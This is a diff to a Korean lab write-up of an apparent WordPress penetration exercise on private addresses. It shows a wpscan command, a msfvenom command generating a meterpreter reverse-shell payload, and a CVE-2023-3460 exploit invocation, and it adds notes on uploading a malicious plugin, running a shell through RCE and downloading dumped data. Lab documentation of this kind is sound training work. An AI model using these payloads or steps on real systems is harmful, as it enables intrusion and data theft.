@@ -72,11 +72,17 @@ wpscan --url http://192.168.0.130 --api-token $WP_SCAN_KEY
 
 ![](../Images/Pasted%20image%2020261019111435.png)
 
+핸드러 run 상태로 열어두기
+새 터미널 열어서 `elementor--pro plugin` 올린 거 확인
+![](../Images/Pasted%20image%2020261020095050.png)
+![](../Images/Pasted%20image%2020261020095108.png)
 
+kali에 `http_shell` 파일 있는지 확인
 
 ![](../Images/Pasted%20image%2020261019111809.png)
 
-
+새 터미널에서, RCE로 다운로드 + 실행
+![](../Images/Pasted%20image%2020261020095131.png)
 ---
 ## 2. 무기화 (Weaponization)
 
@@ -199,7 +205,25 @@ msfvenom -p linux/x64/meterpreter_reverse_http LHOST=<공격자_IP> LPORT=80 -f 
 **공격 시도**
 
 ```bash
-python3 ./CVE-2023-3460/exploit.py http://192.168.0200
+python3 ./CVE-2023-3460/exploit.py http://192.168.0.200
 ```
 
 ![](../Images/Pasted%20image%2020261019141654.png)
+
+
+
+
+
+
+
+
+
+
+![](../Images/meterpreterroot.mp4)
+
+dump 데이터 Value 데이터 확인 가능
+![](../Images/Pasted%20image%2020261020103402.png)
+
+
+덤프 데이터 다운로드 완료
+![](../Images/Pasted%20image%2020261020103803.png)
